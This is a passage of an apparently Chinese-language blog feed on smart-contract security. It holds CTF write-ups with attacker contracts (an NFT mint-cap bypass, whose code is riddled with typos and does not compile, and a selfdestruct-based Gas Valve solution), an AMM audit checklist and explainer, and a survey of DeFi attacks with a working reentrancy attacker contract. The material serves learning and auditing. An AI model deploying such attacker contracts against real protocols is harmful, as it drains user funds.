&#125;</span><br><span class="line">        uint256 total = salePrice * _quantity;</span><br><span class="line"></span><br><span class="line">        _mintForUser(msg.sender, _quantity);</span><br><span class="line">        _refundIfOver(total);</span><br><span class="line">    &#125;</span><br><span class="line">    function currentPhase() public view returns (Phase) &#123;</span><br><span class="line">        if (</span><br><span class="line">            publicSaleStartTime == 0 ||</span><br><span class="line">            block.timestamp &lt; publicSaleStartTime</span><br><span class="line">        ) &#123;</span><br><span class="line">            return Phase.NotStarted;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return Phase.PublicSale;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>联想到之前整理的漏洞，想到，可以使用在攻击合约中的构造函数调用即可,为了在一个交易完成，就写了俩个合约来实现此次的攻击</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">interface IFlatLaunchpeg&#123;</span><br><span class="line">   function publicSaleMint(uint256 _quantity) external payable;</span><br><span class="line">    function transferFrom(address from, address to, uint256 tokenId) external;</span><br><span class="line">    function totalSupply() external returns (uint256);</span><br><span class="line">    function maxPerAddressDuringMint() external returns (uint256);</span><br><span class="line">    function collectionSize() external returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">constract hack1&#123;</span><br><span class="line">    IFlatLaunchpeg nft;</span><br><span class="line">    address attracker;</span><br><span class="line">    contructor(address _nft,address _attracker)&#123;</span><br><span class="line">        runExploit(nft,attracker);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function runExpoit (address nft,attracker) public&#123;</span><br><span class="line">         IFlatLaunchpeg nft = IFlatLaunchpeg(nftAddress);</span><br><span class="line"></span><br><span class="line">        uint256 collectionSize = nft.collectionSize();//总共的NFT</span><br><span class="line">        uint256 maxPerAddress = nft.maxPerAddressDuringMint();//每个合约地址可以铸币的最大数量</span><br><span class="line"></span><br><span class="line">        uint256 startIndex = nft.totalSupply();//已经铸币的数量，也是标识符</span><br><span class="line">        uint256 loops = (collectionSize-startIndex)/maxPerAddress;</span><br><span class="line"></span><br><span class="line">        for (uint i = 0;i&lt;maxPerAddress;i++)&#123;</span><br><span class="line">            new hack2(ntf,attracker，maxPerAddress,stratIndex);</span><br><span class="line">            startIndex +=maxPerAddress;</span><br><span class="line">        &#125;</span><br><span class="line">         //转移剩下的可以铸币的数量</span><br><span class="line">          uint256 mintRemainder = (collectionSize-startIndex)%maxPerAddress;</span><br><span class="line">        if (mintRemainder &gt; 0) new MiniJpegSniperExploiter(nft,to,mintRemainder,startIndex);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hack2&#123;</span><br><span class="line">    //stratIndex 是转移的代币ID，因为每个代币被铸出来，都有一个标识ID，不要误认为是转移这么多代币</span><br><span class="line">    constructor(IFlatLaunchpeg nft,address attracker,uint256 maxPerAddress,uint256 startIndex)&#123;</span><br><span class="line">        ntf.publicSaleMint(maxPerAddress);</span><br><span class="line">        for(uint i = 0;i&lt;per;i++)&#123;</span><br><span class="line">            nft.transferFrom(address(this),attracker,startIndex+i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题要想解决，就是要对铸币NFT有一些了解，执行攻击合约即可完成；</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-GasValue</title>
      <link href="/2024/10/16/CTF-GasValue/"/>
      <url>/2024/10/16/CTF-GasValue/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-GasValue"><a href="#CTF-GasValue" class="headerlink" title="CTF-GasValue"></a>CTF-GasValue</h1><p>这个题要求我们使open为faluse<br>源代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">interface INozzle &#123;</span><br><span class="line">    function insert() external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/// @title Gas Valve</span><br><span class="line">/// @author https://twitter.com/bahurum</span><br><span class="line">/// @notice The evil Dr. N. Gas has created a machine to suck all the air out of the atmosphere. Anon, you must deactivate it before it&#x27;s too late!</span><br><span class="line">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/gas-valve</span><br><span class="line">contract Valve &#123;</span><br><span class="line">    bool public open;</span><br><span class="line">    bool public lastResult;</span><br><span class="line"></span><br><span class="line">    function useNozzle(INozzle nozzle) public returns (bool) &#123;</span><br><span class="line">        try nozzle.insert() returns (bool result) &#123;</span><br><span class="line">            lastResult = result;</span><br><span class="line">            return result;</span><br><span class="line">        &#125; catch &#123;</span><br><span class="line">            lastResult = false;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function openValve(INozzle nozzle) external &#123;</span><br><span class="line">        open = true;</span><br><span class="line">        (bool success,) = address(this).call(abi.encodeWithSelector(this.useNozzle.selector, nozzle));</span><br><span class="line">        require(!success);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先看到这个题的时候，发现前俩天才在java课上学习到了try catch的抛出错误的用法，今天就在solidity中看见了，只不过Java中try catch不仅检查自己本身程序是否有异常，还多个finally的用法，而solidity中，try catch用法主要处理调用外部函数的异常</p><p>分析题目：有接口<code>INozzle</code>,try catch 主要就是检查调用接口中insert函数是否有错误，然后看到openValue函数中居然把opend设置为false,而我有没有发现如何才能改变opend值的地方，就陷入了困境，于是看了一下别人的思路，原来这道题的关键点是如何消耗完gas,并且不会抛出异常，查看这个<a href="https://ethereum.stackexchange.com/questions/594/how-do-gas-refunds-work">问答</a>,了解到Gas refunds are provided when clearing storage or calling on contracts.SELFDESTRUCT，所以我们就可以在调用insert函数中，使用自毁合约，退回gas费用，并且不会抛出错误<br>攻击合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">contract ValveHacker &#123;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function insert() public returns (bool result) &#123;</span><br><span class="line">        selfdestruct(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AMM漏洞分析</title>
      <link href="/2024/10/16/AMM%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2024/10/16/AMM%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="是否使用硬编码滑点"><a href="#是否使用硬编码滑点" class="headerlink" title="是否使用硬编码滑点"></a>是否使用硬编码滑点</h3><p>在高波动时期，使用硬编码滑点会导致交易不佳并冻结用户资金</p><h3 id="有截止日期保护吗"><a href="#有截止日期保护吗" class="headerlink" title="有截止日期保护吗"></a>有截止日期保护吗</h3><p>如果没有截至日期保护，用户交易衡容易收到Sandwich攻击</p><h3 id="是否针对协议储备的验证检查"><a href="#是否针对协议储备的验证检查" class="headerlink" title="是否针对协议储备的验证检查"></a>是否针对协议储备的验证检查</h3><p>如果储备金未经验证，协议可能会面临风险，并且可以借出，从而影响系统的偿付能力。</p><h3 id="AMM是否使用分叉代码"><a href="#AMM是否使用分叉代码" class="headerlink" title="AMM是否使用分叉代码"></a>AMM是否使用分叉代码</h3><p>如果使用了分叉代码，尤其是来自Uniswap等已知项目的代码，并且这些代码没有进行正确更新，或者审计，可能会引入已知的漏洞</p><h3 id="产品常数公式中是否存在舍入问题"><a href="#产品常数公式中是否存在舍入问题" class="headerlink" title="产品常数公式中是否存在舍入问题"></a>产品常数公式中是否存在舍入问题</h3><p>公式中的四舍五入问题可能导致代币交换和流动性供应不准确或不平衡。</p><h3 id="是否可以根据用户输入进行任意调用"><a href="#是否可以根据用户输入进行任意调用" class="headerlink" title="是否可以根据用户输入进行任意调用"></a>是否可以根据用户输入进行任意调用</h3><p>允许基于用户输入的任意调用可能会使合约面临各种漏洞</p><h3 id="是否有适当的机制来防止过度滑点"><a href="#是否有适当的机制来防止过度滑点" class="headerlink" title="是否有适当的机制来防止过度滑点"></a>是否有适当的机制来防止过度滑点</h3><p>如果没有滑点保护，交易者可能会因交易过程中的巨大价格偏差而遭受意外损失。</p><h3 id="AMM是否正确处理不同十进制配置和令牌"><a href="#AMM是否正确处理不同十进制配置和令牌" class="headerlink" title="AMM是否正确处理不同十进制配置和令牌"></a>AMM是否正确处理不同十进制配置和令牌</h3><p>如果 AMM 不支持具有不同小数或类型的令牌，则可能会导致计算错误和潜在损失。</p><h3 id="AMM是否支持转账收费代币"><a href="#AMM是否支持转账收费代币" class="headerlink" title="AMM是否支持转账收费代币"></a>AMM是否支持转账收费代币</h3><p>转账收费代币可能会导致问题，因为发送金额和接收金额不匹配。</p><h3 id="协议是否在代币交换之前计算”minAmountOut”"><a href="#协议是否在代币交换之前计算”minAmountOut”" class="headerlink" title="协议是否在代币交换之前计算”minAmountOut”"></a>协议是否在代币交换之前计算”minAmountOut”</h3><p>集成 AMM 的协议应在掉期之前确定 ‘minAmountOut’，以避免不利的汇率。还应考虑速率的来源和操纵的可能性。</p><h3 id="集成合约是否在其回调函数中验证调用者地址"><a href="#集成合约是否在其回调函数中验证调用者地址" class="headerlink" title="集成合约是否在其回调函数中验证调用者地址"></a>集成合约是否在其回调函数中验证调用者地址</h3><p>如果回调函数不验证调用合约的地址，则可以操纵回调函数。这对于像 ‘swap（）’ 这样涉及代币或资产的函数尤其重要。</p><h3 id="在资金转移给用户之前的最后一步是否强制执行滑点参数"><a href="#在资金转移给用户之前的最后一步是否强制执行滑点参数" class="headerlink" title="在资金转移给用户之前的最后一步是否强制执行滑点参数"></a>在资金转移给用户之前的最后一步是否强制执行滑点参数</h3><p>对中间交换强制执行滑点参数，而不是最后一步，可能会导致用户收到的代币少于其指定的最小值</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AMM(自动化做市商)</title>
      <link href="/2024/10/16/AMM-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%81%9A%E5%B8%82%E5%95%86/"/>
      <url>/2024/10/16/AMM-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%81%9A%E5%B8%82%E5%95%86/</url>
      
        <content type="html"><![CDATA[<h1 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h1><p>长话短说</p><p>你可以将自动做市商视为一个机器人，它总是愿意为你报出两种资产之间的价格。有些使用像 Uniswap 这样的简单公式，而 Curve、Balancer 和其他公司则使用更复杂的公式。</p><p>您不仅可以使用 AMM 进行无需信任的交易，还可以通过向流动性池提供流动性来成为庄家。这基本上允许任何人成为交易所的做市商，并通过提供流动性赚取费用。</p><p>由于 AMM 简单易用，它在 DeFi 领域真正占据了一席之地。以这种方式实现去中心化做市是加密货币愿景的本质。</p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>去中心化金融 (DeFi) 在以太坊和 BNB 智能链等其他智能合约平台上引起了人们的极大兴趣。收益耕种已成为一种流行的代币分配方式，代币化的 BTC 在以太坊上不断增长，闪电贷交易量也在蓬勃发展。</p><p>与此同时，像 Uniswap 这样的自动做市商协议经常会看到有竞争力的交易量、高流动性和不断增加的用户数量。</p><p>但是这些交易所是如何运作的呢？为什么为最新的食品币建立市场如此快速和容易？AMM 真的能与传统的订单簿交易所竞争吗？让我们来一探究竟。</p><h1 id="什么是自动化做市商（AMM）？"><a href="#什么是自动化做市商（AMM）？" class="headerlink" title="什么是自动化做市商（AMM）？"></a>什么是自动化做市商（AMM）？</h1><p>自动做市商 (AMM) 是一种去中心化交易所 (DEX) 协议，它依靠数学公式来为资产定价。与传统交易所使用订单簿不同，资产是根据定价算法来定价的。</p><p>此公式可能因每个协议而异。例如，Uniswap 使用 x * y &#x3D; k，其中 x 是流动性池中一种代币的数量，y 是另一种代币的数量。在这个公式中，k 是一个固定常数，这意味着池的总流动性必须始终保持不变。其他 AMM 将针对其针对的特定用例使用其他公式。然而，它们之间的相似之处在于它们通过算法确定价格。如果现在有点困惑，别担心；希望最终一切都会好起来。</p><p>传统做市商通常与拥有大量资源和复杂策略的公司合作。做市商可帮助您在像币安这样的订单簿交易所获得优惠价格和紧密的买卖价差。自动化做市商将这一过程去中心化，让任何人都可以在区块链上创建市场。他们究竟是如何做到这一点的？让我们继续阅读。</p><h1 id="自动化做市商（AMM）如何运作？"><a href="#自动化做市商（AMM）如何运作？" class="headerlink" title="自动化做市商（AMM）如何运作？"></a>自动化做市商（AMM）如何运作？</h1><p>AMM 的工作原理与订单簿交易所类似，因为有交易对 - 例如 ETH&#x2F;DAI。但是，您不需要在另一边有交易对手（另一个交易者）来进行交易。相反，您与“为您创造”市场的智能合约进行交互。</p><p>在像币安 DEX 这样的去中心化交易所，交易直接发生在用户钱包之间。如果您在币安 DEX 上用 BUSD 卖出 BNB，那么交易的另一端也会有人用他们的 BUSD 购买 BNB。我们可以称之为点对点 (P2P) 交易。</p><p>相比之下，你可以将 AMM 视为点对点合约 (P2C)。交易发生在用户和合约之间，因此不需要传统意义上的交易对手。由于没有订单簿，AMM 上也没有订单类型。你想买或卖的资产的价格由公式决定。不过值得注意的是，未来的一些 AMM 设计可能会抵消这一限制。</p><p>所以不需要交易对手，但还是得有人创造市场，对吧？没错。智能合约中的流动性仍然需要由被称为流动性提供者 (LP) 的用户提供。</p><h1 id="什么是流动资金池？"><a href="#什么是流动资金池？" class="headerlink" title="什么是流动资金池？"></a>什么是流动资金池？</h1><p>what is a liquidity pool</p><p>流动性提供者 (LP) 向流动性池中添加资金。你可以将流动性池视为交易者可以进行交易的一大笔资金。作为向协议提供流动性的回报，LP 可以从其池中发生的交易中赚取费用。在 Uniswap 的情况下，LP 将等值的两个代币（例如，50% 的 ETH 和 50% 的 DAI）存入 ETH&#x2F;DAI 池。</p><p>等等，所以任何人都可以成为做市商？确实如此！向流动性池中添加资金非常容易。奖励由协议决定。例如，Uniswap v2 向交易者收取 0.3% 的费用，这些费用直接流向 LP。其他平台或分叉可能会收取较低的费用，以吸引更多流动性提供者加入其池子。</p><p>为什么吸引流动性很重要？根据 AMM 的工作方式，池中的流动性越多，大额订单可能产生的滑点就越少。这反过来可能会吸引更多交易量到平台，等等。</p><p>滑点问题会因不同的 AMM 设计而有所不同，但这绝对是需要注意的。请记住，定价是由算法决定的。简而言之，它取决于交易后流动性池中代币之间的比率变化程度。如果比率变化幅度很大，就会出现大量滑点。</p><p>更进一步说，假设你想购买 Uniswap 上 ETH&#x2F;DAI 池中的所有 ETH。你做不到！你必须为每个额外的 ETH 支付越来越高的溢价，但仍然无法从池中全部购买。为什么？这是因为公式 x * y &#x3D; k。如果 x 或 y 为零，意味着池中的 ETH 或 DAI 为零，则该等式不再有意义。</p><p>但这并不是关于 AMM 和流动性池的完整故事。在为 AMM 提供流动性时，你还需要记住另一件事——无常损失。</p><h1 id="什么是无常损失？"><a href="#什么是无常损失？" class="headerlink" title="什么是无常损失？"></a>什么是无常损失？</h1><p>无常损失是指将存入的代币存入池后其价格比率发生变化的情况。变化越大，无常损失越大。这就是为什么 AMM 最适合使用具有相似价值的代币对（例如稳定币或包装代币）。如果该对之间的价格比率保持在相对较小的范围内，则无常损失也可以忽略不计。</p><p>另一方面，如果比率变化很大，流动性提供者可能最好只是持有代币，而不是向池子里添加资金。即便如此，像 ETH&#x2F;DAI 这样容易遭受无常损失的 Uniswap 池子也因它们累积的交易费而盈利。</p><p>话虽如此，无常损失并不是这种现象的好名字。“无常”假设如果资产恢复到最初存入时的价格，损失就会减轻。然而，如果你以与存入时不同的价格比率提取资金，损失将是永久性的。在某些情况下，交易费可能会减轻损失，但考虑风险仍然很重要。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>矿工攻击</title>
      <link href="/2024/10/16/%E7%9F%BF%E5%B7%A5%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/16/%E7%9F%BF%E5%B7%A5%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p> 矿工可以验证交易并将它添加到区块链中，操纵哈希或者时时间戳等区块属性来影响合约的执行或结果</p><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><p> 是否明智使用了block.timestamp，尤其是对于较长的间隔，block.timestamp可以被矿工再很小的程度上操纵，影刺依赖它进行计算时可能会有风险</p><h2 id="价格操控攻击"><a href="#价格操控攻击" class="headerlink" title="价格操控攻击"></a>价格操控攻击</h2><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p> 攻击者故意改变去中心化交易所的资产价格，通常是为了依赖利用合约或者交易</p><h4 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h4><p>如果价格或资产之间的汇率是从余额比率得出的，则可以对其进行操纵。闪电贷和捐赠是众所周知的用于操纵价格的攻击媒介。</p><h2 id="重入攻击"><a href="#重入攻击" class="headerlink" title="重入攻击"></a>重入攻击</h2><p>重入攻击是一种针对智能合约的安全漏洞，攻击者利用合约在执行期间的状态不一致性，通过多次调用合约的某个函数，从而导致资金或数据的异常损失。下面将详细细分重入攻击的类型，并通过具体示例进行说明。</p><h3 id="单个合约重入攻击"><a href="#单个合约重入攻击" class="headerlink" title="单个合约重入攻击"></a>单个合约重入攻击</h3><h4 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h4><p>攻击者利用合约中的漏洞，在同一合约内重复调用函数，导致状态不一致或资金损失。</p><h4 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h4><p>某个合约允许用户提取资金，攻击者利用重入漏洞在提现过程中多次调用提现函数，导致超过账户余额的提取。</p><h3 id="跨合约重入攻击"><a href="#跨合约重入攻击" class="headerlink" title="跨合约重入攻击"></a>跨合约重入攻击</h3><h4 id="漏洞描述：-1"><a href="#漏洞描述：-1" class="headerlink" title="漏洞描述："></a>漏洞描述：</h4><p>攻击者首先调用一个合约的函数，该函数再调用另一个合约的函数，然后再通过回调再次调用原合约，造成多次执行。</p><h4 id="举例：-1"><a href="#举例：-1" class="headerlink" title="举例："></a>举例：</h4><p>攻击者首先通过一个合约调用一个函数，该函数在执行时又调用了另一个合约的提现功能，再通过该合约的回调再次执行提取。</p><h3 id="可重入合约"><a href="#可重入合约" class="headerlink" title="可重入合约"></a>可重入合约</h3><h4 id="漏洞描述：-2"><a href="#漏洞描述：-2" class="headerlink" title="漏洞描述："></a>漏洞描述：</h4><p>攻击者能够利用合约在执行期间保持的状态，通过合约中的逻辑漏洞进行多次操作。</p><h4 id="举例：-2"><a href="#举例：-2" class="headerlink" title="举例："></a>举例：</h4><p>某合约在处理资金转移时未能正确更新余额，导致攻击者能够多次调用并提取资金。</p><h3 id="不可重入合约"><a href="#不可重入合约" class="headerlink" title="不可重入合约"></a>不可重入合约</h3><h4 id="漏洞描述：-3"><a href="#漏洞描述：-3" class="headerlink" title="漏洞描述："></a>漏洞描述：</h4><p>设计上防止重入，但可能由于外部合约的逻辑漏洞而被攻击。</p><h4 id="举例：-3"><a href="#举例：-3" class="headerlink" title="举例："></a>举例：</h4><p>如果合约调用了不安全的外部合约，而该外部合约的逻辑存在重入漏洞，依然可能导致攻击。</p><ol start="2"><li>重入攻击示例<br>2.1 单合约重入攻击示例<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vulnerable &#123;</span><br><span class="line">    mapping(address =&amp;gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &amp;gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line">        // 调用外部合约</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">        // 更新余额</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>攻击者合约：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attacker &#123;</span><br><span class="line">    Vulnerable public vulnerable;</span><br><span class="line"></span><br><span class="line">    constructor(address _vulnerable) &#123;</span><br><span class="line">        vulnerable = Vulnerable(_vulnerable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        require(msg.value &amp;gt;= 1 ether);</span><br><span class="line">        vulnerable.deposit&#123;value: msg.value&#125;();</span><br><span class="line">        vulnerable.withdraw(1 ether); // 初次提现</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 回调函数</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (address(vulnerable).balance &amp;gt;= 1 ether) &#123;</span><br><span class="line">            vulnerable.withdraw(1 ether); // 继续重入</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>攻击过程：</li></ol><p>19.攻击者先存入 1 Ether，然后调用 withdraw 函数进行提取。<br>20.在提取过程中，由于未更新余额，攻击者的回调函数 receive 被触发。<br>21.该函数再次调用 withdraw 函数，从而继续提取资金，导致合约资金损失。</p><p>2.2 跨合约重入攻击示例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Target &#123;</span><br><span class="line">    mapping(address =&amp;gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &amp;gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">        balances[msg.sender] -= amount; // 更新余额</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attacker &#123;</span><br><span class="line">    Target public target;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        target = Target(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        require(msg.value &amp;gt;= 1 ether);</span><br><span class="line">        target.deposit&#123;value: msg.value&#125;();</span><br><span class="line">        target.withdraw(1 ether); // 开始攻击</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (address(target).balance &amp;gt;= 1 ether) &#123;</span><br><span class="line">            target.withdraw(1 ether); // 重入攻击</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击过程：</p><p>22.攻击者向目标合约存入资金并调用 withdraw。<br>23.当目标合约尝试将 Ether 转给攻击者时，回调 receive 被触发，攻击者再次调用 withdraw。<br>24.这一过程持续进行，直到合约资金耗尽。</p><ol start="3"><li>防范重入攻击的方法</li></ol><p>25.检查-效果-交互模式：在进行外部调用之前，首先更新合约状态。<br>26.使用重入锁：在合约中设置状态变量以防止重入。<br>27.使用安全库：借助如 OpenZeppelin 这样的经过审计的智能合约库，避免已知漏洞。<br>28.限制外部调用：尽量减少合约对外部合约的调用次数和频率。</p><p>总结<br>重入攻击是一种常见且严重的安全漏洞，开发者必须在设计和实现智能合约时采取适当的安全措施，以防止此类攻击。理解重入攻击的细分类型和具体示例可以帮助开发者更好地识别和修复潜在的安全漏洞。</p><h2 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h2><h3 id="对于失败事务的重放攻击"><a href="#对于失败事务的重放攻击" class="headerlink" title="对于失败事务的重放攻击"></a>对于失败事务的重放攻击</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>一个初始交易失败了，如果没有防护机制，而攻击者又通过网络监听工具捕获到了这个失败的交易数据包，那么攻击者就可以重新发送这个交易，造成资金的重复扣除，或者资金的重复转移</p><h3 id="不同链上的签名重放"><a href="#不同链上的签名重放" class="headerlink" title="不同链上的签名重放"></a>不同链上的签名重放</h3><h4 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>在一条链上的有效签名可能会在另一条链上重放</p><h4 id="举例-2"><a href="#举例-2" class="headerlink" title="举例"></a>举例</h4><p>1，相同地址在不同链上<br>假设用户 A 在以太坊链（Ethereum）和以太坊经典链（Ethereum Classic）上使用相同的地址（公钥）。如果用户 A 在以太坊上发起了一笔交易并签名：<br>a,攻击者可以捕获这个交易，然后在以太坊经典链上重放这个交易。<br>b,由于这两个链都使用了相似的地址格式，攻击者可以成功地在以太坊经典链上转移用户 A 的资产。</p><p>2,跨链重放攻击<br>一些链可能会使用类似的交易格式。如果链 A 和链 B 都是以太坊虚拟机（EVM）兼容链：<br>a,用户 A 在链 A 上发送了一笔交易。<br>b,攻击者可以把同样的交易信息（包括签名）提交到链 B。<br>c,如果链 B 不进行链 ID 或其他唯一标识的检查，攻击者可能成功重放交易。</p><h2 id="地毯拉力"><a href="#地毯拉力" class="headerlink" title="地毯拉力"></a>地毯拉力</h2><p>地毯拉力攻击是一种特定的欺诈行为，主要发生在去中心化金融（DeFi）和其他基于区块链的应用中。这种攻击通常涉及一个恶意开发者或团队创建一个看似合法的项目，吸引用户投资或提供流动性，但最终他们会通过某种方式迅速撤回资金，导致投资者损失惨重。</p><h4 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>1.假冒项目：攻击者通常创建一个新的加密货币或去中心化应用，宣传其潜在收益，吸引投资者参与。<br>2.流动性撤回：一旦足够多的用户投资或提供流动性，攻击者会撤回流动性池中的所有资产，导致代币价值暴跌。<br>3.信任利用：这种攻击往往利用了用户对去中心化金融项目的信任，尤其是新项目往往缺乏足够的透明度和审计。<br>4.快速撤资：攻击者会迅速转换为稳定币或其他更稳定的资产，以避免价格波动对他们资金的影响。</p><h4 id="举例-3"><a href="#举例-3" class="headerlink" title="举例"></a>举例</h4><p>1,DeFi项目：一些新兴的DeFi项目可能会在短时间内吸引大量资金，攻击者会通过在社交媒体上制造热度来吸引投资者。投资者在没有进行充分尽职调查的情况下，盲目跟风投资，最终遭受损失。<br>2,代币发行：攻击者发布一个新代币，并在上线初期表现良好，随后在价格上涨时抛售持有的代币，导致代币价格暴跌。</p><h2 id="三明治攻击"><a href="#三明治攻击" class="headerlink" title="三明治攻击"></a>三明治攻击</h2><h4 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>攻击者可以监控内存池，并在用户交易之前和之后放置两个交易。</p><h4 id="举例-4"><a href="#举例-4" class="headerlink" title="举例"></a>举例</h4><p>当攻击者发现一笔大额交易时，首先执行自己的交易以操纵价格，然后在用户的交易执行后通过平仓来获利</p><h2 id="女巫攻击"><a href="#女巫攻击" class="headerlink" title="女巫攻击"></a>女巫攻击</h2><h4 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>攻击者通过控制多个账户或者利用多个交易来操纵市场或者影响特定的智能合约行为</p><h4 id="举例-5"><a href="#举例-5" class="headerlink" title="举例"></a>举例</h4><p>假设某个用户在去中心化交易所上进行大额交易，导致某个代币的价格上涨。<br>1，攻击者监控市场：攻击者监控到用户的交易，并预测价格将上涨。<br>2，创建假需求：攻击者在多个账户中同时下单购买该代币，进一步推高价格。<br>3，获利抛售：一旦价格达到一个理想的水平，攻击者便在合适的时机抛售手中的代币，获得差价收益。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意破环攻击</title>
      <link href="/2024/10/16/%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/16/%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>攻击者通过恶意破坏系统，通常它们不会有盈利的，就是恶意破坏运营和用户，它们可以通过链上的轻微改变来阻止用户交易</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
        <tags>
            
